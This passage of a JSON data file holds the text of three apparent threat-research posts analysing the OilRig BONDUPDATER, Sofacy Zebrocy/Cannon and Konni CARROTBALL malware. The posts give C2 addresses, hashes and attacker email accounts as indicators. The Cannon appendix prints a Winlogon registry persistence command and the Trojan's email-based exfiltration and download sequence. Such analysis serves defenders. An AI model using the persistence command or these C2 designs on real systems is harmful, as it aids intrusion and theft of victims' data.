                "However, this is correct, as the action type is inserted at offset 8 before the part number was inserted at offset 3. Therefore, we believe the C2 server just adds the two offsets together to find the actual location of the action type in the string."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Original Data Transfer using DNS Tunneling"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The original data transfer process within BONDUPDATER looked for specific A records within answers to DNS queries, shown in Table 3.",
                "The Trojan processed the A records in the C2 response to obtain a filename, which specifically looks for an IPv4 address within the A record with \"24.125\" in the first two octets.",
                "The Trojan appends the remaining two octets of this A record to the string \"rcvd\" and uses this as the filename to save future data to in the \"receivebox\" folder.",
                "This IP address also instructs the Trojan to treat following DNS A records as data.",
                "The following DNS A records are split on the \".\"",
                "and each of the first three octets are treated as data, whereas the fourth octet is used as a counter to obtain the correct chunk of data.",
                "Lastly, the Trojan looks for the A record \"1.2.3\" as a signal to write the provided data to the specified file, which is then subjected to the previously mentioned file-based command handler."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3 IP Addresses and their meanings within the original data transfer process in BONDUPDATER"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "New Data Transfer using DNS Tunneling"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This BONDUPDATER sample has a new method to obtain files from the C2 server using a series of DNS TXT queries.",
                "This method follows a similar process as the original method but uses DNS TXT results to obtain a filename and the data to write to the file.",
                "Once data is written to the file system, this method uses the same command handler as the original method to process the contents of the file based on the trailing character of the filename, as seen in Table 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 can initiate the new command handling functionality by responding to the initial beacon with a DNS A record of \"99.250.250.199\".",
                "The script will enter a loop attempting to communicate with its C2 every 50 milliseconds, looking for a series of responses with specific characters that the script will use as instructions to determine how to handle the result of the TXT record, which can be seen in Table 4.",
                "The Trojan will split each TXT record from the C2 response on the character \">\", with the data to the left of the \">\" character used as the instruction and the data to the right as the data."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 4 Instructions within the new data transfer process in BONDUPDATER and their meanings"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While we have not seen the C2 use this TXT record-based communications, we believe the process would involve the C2 providing a TXT record with the \"S000s\" instruction to set the filename to which data is saved.",
                "The C2 would then provide a series of \"S\" instructions to provide data, followed by the \"E\" instruction to write that data to the file, which would then be subjected to the command handler."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As expected, OilRig is continuing their onslaught of attacks well into 2018 with continued targeting in the Middle East.",
                "Sometimes developing new tools, OilRig also often uses what has worked in the past, including developing variants of previously used tools and malware.",
                "This reduces development time and capitalizes on previous versions of the tool and its success."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Oilrig is a highly diverse and very resourceful threat actor, employing a litany of methods and tools to compromise victims, but Palo Alto Networks customers are protected from this OilRig attack and BONDUPDATER by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BONDUPDATER C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "withyourface[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BONDUPDATER Dropper Docs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c0018a2e36c7ef8aa15b81001a19c4127ad7cd21ae410c1f854e5dadfa98b322"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7"
            ]
        }
    ],
    "3f13bb39be93c0fe3aba65c4dddcb755c71c7525": [
        {
            "type": "paragraph",
            "content": [
                "In late October and early November 2018, Unit 42 intercepted a series of weaponized documents that use a technique to load remote templates containing a malicious macro.",
                "These types of weaponized documents are not uncommon but are more difficult to identify as malicious by automated analysis systems due to their modular nature.",
                "Specific to this technique, if the C2 server is not available at the time of execution, the malicious code cannot be retrieved, rendering the delivery document largely benign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The weaponized documents targeted several government entities around the globe, including North America, Europe, and a former USSR state.",
                "Fortunately for us, the C2 servers for several of these documents were still operational allowing for retrieval of the malicious macro and the subsequent payloads.",
                "Analysis revealed a consistent first-stage payload of the well-documented Zebrocy Trojan.",
                "Additional collection of related documents revealed a second first-stage payload that we have named Cannon.",
                "Cannon has not been previously observed in use by the Sofacy group and contains a novel email-based C2 communication channel.",
                "Email as a C2 channel is not a new tactic, but it is generally not observed in the wild as often as HTTP or HTTPS.",
                "Using email as a C2 channel may also decrease the chance of detection, as sending email via non-sanctioned email providers may not necessarily construe suspicious or even malicious activity in many enterprises."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The activity discussed in this blog revolves around two of the multitude of weaponized documents that we collected.",
                "These two documents shared multiple data artifacts, such as a shared C2 IP, shared author name, and shared tactics.",
                "Details of the extended attack campaign associated with the Cannon Trojan will be discussed in a later blog.",
                "A particularly interesting aspect of one of the two documents we analyzed was the filename used, crash list(Lion Air Boeing 737).docx.",
                "This is not the first instance of an adversary group using recent current events as a lure, but it is interesting to see this group attempt to capitalize on the attention of a catastrophic event to execute their attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attack Details"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial sample we intercepted was a Microsoft Word document (SHA256: 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f) with the filename crash list(Lion Air Boeing 737).docx using the author name Joohn.",
                "This document appeared to be targeting a government organization dealing with foreign affairs in Europe via spear-phishing.",
                "Once the user attempts to open the document, Microsoft Word immediately attempts to load the remote template containing a malicious macro and payload from the location specified within the settings.xml.rels file of the DOCX document, as seen here:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the C2 has already been taken offline the document will still open, but Word will be unable to retrieve the remote template and thus Word will not load a macro.",
                "In this situation, Word will present the same lure document to the victim as seen in Figure 2, but without the ability to enable macros via an Enable Content button.",
                "Assuming the C2 is still operational however, Word loads the remote template (SHA256: f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5) and the user is presented with the screen as seen in Figure 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Lure screen"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the victim presses the Enable content button, the embedded macro is executed.",
                "The macros used for these delivery documents use a less common method of using the AutoClose function.",
                "This is a form of anti-analysis as Word will not fully execute the malicious code until the user closes the document.",
                "If an automated sandbox exits its analysis session without specifically closing out the document, the sandbox may miss the malicious activity entirely.",
                "Once successfully executed, the macro will install a payload and save a document to the system.",
                "Typically, we expect to see a decoy document saved to the system and later displayed to make the victim less suspicious of malicious activity; however, in this case the document saved to the system was never displayed and does not contain any pertinent content to the Lion Air tragedy theme seen in the filename.",
                "The macro obtains the document saved to the system from within the document stored as UserForm1.Label1.Caption and will write it to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%TEMP%\\~temp.docm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro obtains the payload saved to the system from within the document stored as UserForm1.Label2.Caption and will write it to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%APPDATA%\\MSDN\\~msdn.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro executes this payload in a rather interesting way by loading the dropped ~temp.docm document and calling a function within its embedded macro to run the payload.",
                "We believe the creator of this delivery document chose to run the payload from the dropped file as an evasion technique.",
                "Also, the fact the initial macro uses this dropped document for the execution of the payload may also explain why the document did not contain any decoy contents."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To carry out this functionality, after writing the ~temp.docm and ~msdn.exe files to the system, the initial macro will load the ~temp.docm file as a Word Document object and attempts to run the function Proc1 in the Module1 macro within the ~temp.docm file, as seen in the following code snippet:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Proc1 function within the Module1 does nothing more than build the %APPDATA%\\MSDN\\~msdn.exe path to the dropped payload and executes it using the built-in Shell function, as seen in the following code snippet:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload dropped to the system (SHA256: 6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a) is a UPX packed Zebrocy variant written in the Delphi language.",
                "This variant of Zebrocy is functionally very similar to the Delphi-based payloads discussed in our previous publication on Sofacy attacks using Zebrocy earlier this year.",
                "The developer of this particular payload configured it to use the following URL to communicate with as its C2:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://188.241.58[.]170/local/s3/filters.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Zebrocy Trojan gathers system specific information that it will send to the C2 server via an HTTP POST request to the above URL.",
                "Like other Zebrocy samples, this Trojan collects system specific information it will send to the C2 server by running the command SYSTEMINFO & TASKLIST on the command line and by enumerating information about connected storage devices.",
                "This specific variant of Zebrocy will also send a screenshot of the victim host as a JPEG image to the C2 server.",
                "The C2 server will then provide a secondary payload to the beacon in ASCII hexadecimal representation, which the Trojan will decode and write to the following location:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%APPDATA%\\Roaming\\Audio\\soundfix.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our analysis, the C2 server provided a secondary payload that functionally appeared similar to the initial Zebrocy sample.",
                "The secondary payload was also written in Delphi and its developer configured it to communicate with its C2 server using HTTPS via the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://200.122.181[.]25/catalog/products/books.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "New Cannon Trojan"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were able to collect a second delivery document that shared the Joohn author from the crash list(Lion Air Boeing 737).docx document, as well as the 188.241.58[.]170C2 IP to host its remote template.",
                "Structurally this sample was very similar to the initially analyzed document, but the payload turned out to be a completely new tool which we have named Cannon."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The tool is written in C# whose malicious code exists in a namespace called cannon, which is the basis of the Trojans name.",
                "The Trojan functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server.",
                "To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587.",
                "The specific functions of Cannon can be seen in Table 1.",
                "This tool also has a heavy reliance on EventHandlers with timers to run its methods in a specific order and potentially increase its evasion capability."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Functions executed by Cannon and their purpose"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The overall purpose of Cannon is to use several email accounts to send system data (system information and screenshot) to the threat actors and to ultimately obtain a payload from an email from the actors.",
                "The image in Figure 2, in addition to the following step-by-step process illustrates how Cannon communicates with the actor-controlled C2 email address to obtain a secondary payload:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 C2 process flow for Cannon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For a complete analysis of Cannon, please refer to the Appendix."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Sofacy threat group continues to target government organizations in the EU, US, and former Soviet states to deliver the Zebrocy tool as a payload.",
                "In these attacks, the delivery documents used to install Zebrocy used remote templates, which increases the difficulty to analyze the attack as an active C2 server is needed to obtain the macro-enabled document.",
                "The Sofacy group also leveraged the recent Lion Air disaster as a lure in one of these attacks, which continues to show a willingness to use current events in their social engineering themes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Of note, we also discovered the Sofacy group using a very similar delivery document to deliver a new Trojan called Cannon.",
                "Cannon uses SMTPS and POP3S as its C2 channel compared to Zebrocy that uses a more commonly observed HTTP or HTTPS based C2.",
                "This is not a new tactic but may be more effective at evading detection as the external hosts involved are a legitimate email service provider.",
                "Add the layer of encryption that the SMTPS and POP3S protocols provide to the legitimate web-based service and you have a very difficult C2 channel to block"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "WhileSofacys campaign delivering Zebrocy and Cannonremains active, Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Delivery Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f\naf77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote Template Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5\nfc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote Templates"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://188.241.58[.]170/live/owa/office.dotm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Zebrocy Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Zebrocy C2 URLs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://188.241.58[.]170/local/s3/filters.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://200.122.181[.]25/catalog/products/books.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cannon Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cannon Email Accounts\nsahro.bella7[at]post.cz\ntrala.cosh2[at]post.cz\nbishtr.cam47[at]post.cz\nlobrek.chizh[at]post.cz\ncervot.woprov[at]post.cz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Cannon Trojan is written in C# and functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server.",
                "To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587.",
                "This tool uses a variety of functions that are run in a specific order to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The functions called to carry out these activities are as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "start_Tick"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This function starts off by writing the string {SysPar = 65}to a file named s.txt, which will be used during C2 communications throughout the execution of this Trojan.",
                "This function is also responsible for creating persistence by writing the following to r.batand executing it:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "REG ADD \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t",
                "REG_SZ /d",
                "[path to wsslc.exe]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It also creates a unique system specific identifier that it will use during the C2 communications to send and receive messages.",
                "The system specific identifier is a 16 character string that the Trojan creates using the serial number of the C volume and the first 4 hexadecimal bytes from Environment.UserName.",
                "The start_Tick function then begins the timer to run the inf_Tick method."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "inf_Tick"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Responsible for gathering system information, which it then saves to the i.ini file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It will use the aforementioned authentication credentials to log into the SMTP server to send the i.ini file to the C2 email address.",
                "The email sent to exfiltrate this information will have i.ini attached to it with the unique system identifier as the subject and S_inf within the body of the email message.",
                "The inf_Tick function then begins the timer to run the screen_Tickmethod."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "screen_Tick"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Takes a screenshot of the desktop and saves it to a file named sysscr.ops.",
                "It will use the aforementioned authentication credentials to log into the SMTP server to send the sysscr.ops file to the C2 email address.",
                "The email sent to exfiltrate this information will have sysscr.ops file attached to it with the unique system identifier as the subject and SCreen within the body of the email message.",
                "The screen_Tick function then begins the timer to run the txt_Tickmethod."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "txt_Tick"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name trala.cosh2[at]post.cz.",
                "If successful, the Trojan will access the messages in the inbox, specifically looking for any emails that have a subject that matches the unique system identifier.",
                "If an email exists, the Trojan will treat the email's body as hexadecimal format and save it to a variable that will be used by the load_Tickfunction.",
                "The Trojan will delete the email after reading and processing these emails."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address.",
                "The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and the stringok within the body of the email message.",
                "The txt_Tick function then begins the timer to run the load_Tickmethod."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "load_Tick"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will first remove all occurrences of B& and Db from the text obtained from the email in the txt_Tick function.",
                "The Trojan will then split the remaining text on the % character and treat the content to the left of the % character as an account name and the content to the right as a password.",
                "The Trojan uses these credentials to log into another email account at pop.seznam[.]cz via POP3s, which it will check for email messages that have the unique system identifier as the subject.",
                "The Trojan will parse emails with the correct subject to obtain its attachments.",
                "The Trojan will save any attachments whose names contain the string auddevc to the system, which is meant to download a file named auddevc.txt.",
                "The Trojan will also create a file named l.txt that it will write the string 090 to."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the Trojan obtained the file from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address.",
                "The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok2 within the body of the email message.",
                "The load_Tick function then begins the timer to run the subject_Tick method."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "subject_Tick"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This function is very similar in functionality to the txt_Tickfunction.",
                "Just like the txt_Tickfunction, the Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name trala.cosh2@post[.]cz, again looking for subject of emails in the inbox that match the unique system identifier.",
                "The Trojan will then treat the body of the email as hexadecimal data that it will save to a variable that will be used by the run_Tickfunction.",
                "The contents saved to the variable should be the path in which the actor wishes the file saved in the load_Tickfunction to be moved to and run from."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address.",
                "The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok3 within the body of the email message.",
                "The subject_Tick function then begins the timer to run the run_Tickmethod."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "run_Tick"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will first attempt to create the directory within the path obtained from the email in the subject_Tickfunction.",
                "It then attempts to move the auddevc.txt file downloaded in the load_Tickfunction to the newly created directory.",
                "If the file was successfully moved, the Trojan it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address.",
                "The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok4 within the body of the email message."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan then attempts to create a process using the newly moved downloaded file.",
                "If the Trojan was able to successfully run the download file, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address.",
                "The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok5 within the body of the email message.",
                "The Trojan would then delete the sysscr.ops screenshot file and the i.ini system information file before exiting."
            ]
        }
    ],
    "bba80b4cc5926c462004234a9081e58149e6524a": [
        {
            "type": "paragraph",
            "content": [
                "Between July and October 2019, Unit 42 observed several malware families typically associated with the Konni Group (see Attribution section below for more details) used to primarily target a US government agency, using the ongoing and heightened geopolitical relations issues surrounding North Korea to lure targets into opening malicious email attachments.",
                "The malware families used in this campaign consisted mainly of malicious documents featuring CARROTBAT downloaders with SYSCON payloads, but also included a new malware downloader Unit 42 has dubbed CARROTBALL."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CARROTBALL, initially discovered in an attack during October 2019, is a simple FTP downloader utility which facilitates the installation of SYSCON, a full-featured Remote Access Trojan (RAT) which leverages FTP for Command and Control (C2).",
                "It was found embedded in a malicious Word document sent as a phishing lure to a US government agency and two non-US foreign nationals professionally associated with North Korea."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Throughout the course of the campaign, Unit 42 ultimately observed a total of six unique malicious document lures being sent as attachments from four unique Russian email addresses to 10 unique targets.",
                "The subject matter of the lures featured articles written in Russian pertaining to ongoing geopolitical relations issues surrounding North Korea.",
                "Of those malicious documents, five contained CARROTBAT downloaders, and one contained a CARROTBALL downloader.",
                "All malicious second stage payloads were SYSCON."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While this campaign does demonstrate some evolution in the actors tactics, techniques and procedures (TTPs) with the use of a new downloader family and new malicious code in the form of Word Document macros, the majority of its attributes bear a strong resemblance to the Fractured Block campaign previously reported by Unit 42 in November 2018.",
                "As such, Unit 42 has dubbed this campaign Fractured Statue.",
                "The Adversary Playbook for the activity described in this blog can be found here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1.",
                "Fractured Statue Campaign Timeline"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Between July 15th, 2019 and July 17th, 2019, spear phishing emails were sent to a total of five individuals at a US government agency from the email addresses 0tdelkorei@mail[.]ru and kargarnova@mail[.]ru.",
                "The spear phishing emails utilized three different email subjects with malicious macro documents attached with the same name; all file names were written in Russian.",
                "Further, all of the malicious documents contained articles written in Russian pertaining to ongoing geopolitical relations issues surrounding North Korea.",
                "The documents themselves were rather generic and had no embedded image enticements to enable macros.",
                "They did, however, leverage second-stage downloader components consistent with known CARROTBAT samples, and almost all of them featured SYSCON payloads.",
                "The first pages of each of these documents are shown below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2. First page of initial malicious document observed in the campaign."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Associated with CARROTBAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "First phishing attempt details."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3. First page of second malicious document observed in the campaign."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Associated with CARROTBAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. Second phishing attempt details."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. First page of third malicious document observed in the campaign."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Associated with CARROTBAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3. Third phishing attempt details."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Roughly one month later, beginning on August 15, 2019 and ending on September 14, 2019, the second wave of CARROTBAT attacks occurred against three additional email addresses at the same government agency.",
                "One attack featured the same sender and malicious document but had a different subject and filename.",
                "The other two emails contained a previously unseen malicious document and featured a mix of Russian and English languages in both the document lures and the email correspondence."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 4. Fourth phishing attempt details."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5.",
                "First page of fourth malicious document observed in the campaign.",
                "Associated with CARROTBAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 5. Fifth phishing attempt details."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6.",
                "First page of the fifth malicious document observed in the campaign.",
                "Associated with CARROTBAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 6. Sixth phishing attempt details."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On October 29, 2019, one of the same individuals targeted in the second wave of attacks was targeted again with a malicious document, though in this attack the sender was different and the document lure did not feature CARROTBAT.",
                "Also of note is that the lure in this attack did feature a more traditional enable macro cover page, but was then followed by additional pages in Russian that thematically matched with the documents found in the rest of the campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7. First page of sixth malicious document observed in the campaign.",
                "Associated with CARROTBALL."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 7. Seventh phishing attempt details."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Also interesting to note is that the sender added multiple recipients to their email; one was an individual at a US government agency, and the other two individuals were non-US foreign nationals professionally associated with ongoing activities in North Korea."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the exception of the October 2019 attack, all of the malicious documents found in this campaign featured the following macro code snippet of interest:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8.",
                "Macro from malicious documents associated with CARROTBAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When executed, this code will:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As previously mentioned, all samples featuring the macros above also featured CARROTBAT as a second stage downloader."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The October 2019 attack, however, differed significantly from the previous ones.",
                "Instead of reading from the contents of the document itself, the macros leveraged an embedded Windows executable in the form of hex bytes delimited via the | character that ultimately acted as a dropper.",
                "When the macro was executed, the hex bytes were split, converted to binary, and dropped onto disk as an executable.",
                "The first few lines of this functionality are shown below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9.",
                "Macro from malicious documents associated with CARROTBALL."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this case, the dropped binary was a new type of downloader we have dubbed CARROTBALL.",
                "Its sole purpose was to serve as the main mechanism to facilitate the download and installation of the SYSCON backdoor.",
                "This is very similar to the CARROTBAT samples observed earlier on in this campaign and in the previous Fractured Block campaign (see technical analysis here).",
                "Additionally, of novel interest in this attack was the use of two separate FTP credential pairs to conduct active C2 operations.",
                "One credential pair was hardcoded in the dropped CARROTBALL binary and used to connect to the domain downplease.c1[.]biz to retrieve a CAB file renamed with a generic .dat extension."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10.",
                "Observed CARROTBALL FTP interaction."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When extracted, the .cab file was found to contain two malicious batch files, two malicious dlls (one of which contained a custom base64 alphabet), and a second domain (lookplease.c1[.]biz) with a set of FTP login credentials encoded in the custom base64 alphabet.",
                "The contents of the cab file are as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 11.",
                "Converted CAB file contents extracted from observed CARROTBALL FTP interaction."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 8.",
                "CAB file contents."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While observing the malwares interaction with the second domain, lookplease.c1[.]biz, two text files were subsequently identified containing text encoded with the same custom base64 alphabet used previously.",
                "When decoded, these files were found to contain additional commands to be executed on the infected host."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 9.",
                "SYSCON C2 file attributes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At the time of the activity, both downplease.c1[.]biz and lookplease.c1[.]biz resolved to the IP address 185.176.43[.]94."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Originally, the name Konni was used to refer to a Remote Access Trojan utilized in targeted campaigns with strong links to North Korean interests.",
                "However, as additional campaigns began to appear with strongly overlapping TTPs yet did not feature the Konni RAT, specifically, some industry researchers simply began to adopt the Konni moniker to refer to the actors behind the aggregated set of activity.",
                "Unit 42 has followed this trend, and now refers to the Konni Group as such."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As prominently documented by Cisco Talos, the first Konni Group activity was a sustained information stealing/RAT distribution campaign spanning between 2014 and 2017.",
                "Throughout 2018, Unit 42 released several blogs on Konni Group activity, and subsequently identified two new malware families the group was using in the attacks, dubbed NOKKI and CARROTBAT, respectively.",
                "Now, in 2019, Unit 42s continued observation of targeted CARROTBAT activity (in addition to the new malware CARROTBALL being used during the same campaign) could indicate that both are still in use by the Konni Group, as thematically linked elements of Konni Group TTPs include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, there are non-trivial obstacles to obtaining a high-confidence attribution to the Konni Group, namely the fact that previous blogs produced by Unit 42 and other researchers contain a great deal of technical detail about the groups operations, and copycat actors may attempt to emulate previously observed TTPs to hinder attribution efforts or perform false-flag operations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In light of these factors, Unit 42 assesses with moderate confidence that this activity is related to the Konni Group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Overall, the Fractured Statue campaign provides clear evidence that the TTPS discovered in Fractured Block are still relevant, and that the group behind the attacks still appears to be active.",
                "Additionally, development and use of the new downloader, CARROTBALL, alongside the more commonly observed malware delivery mechanism, CARROTBAT, may indicate that the previous methods employed by the group to successfully infect their targets are becoming less effective.",
                "The Adversary Playbook for the activity described in this blog can be found here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "* AutoFocus customers can track these samples with the FracturedStatue, SYSCON, KONNI, CARROTBAT and CARROTBALL tags."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "* WildFire detects all files mentioned in this report with malicious verdicts."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "* Cortex XDR blocks all of the files currently associated with the Fractured Block campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a4f858c6b54683d3b7455c9adcf2bb6b7ddc1f4d35d0f8f38a0f131c60d1790f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
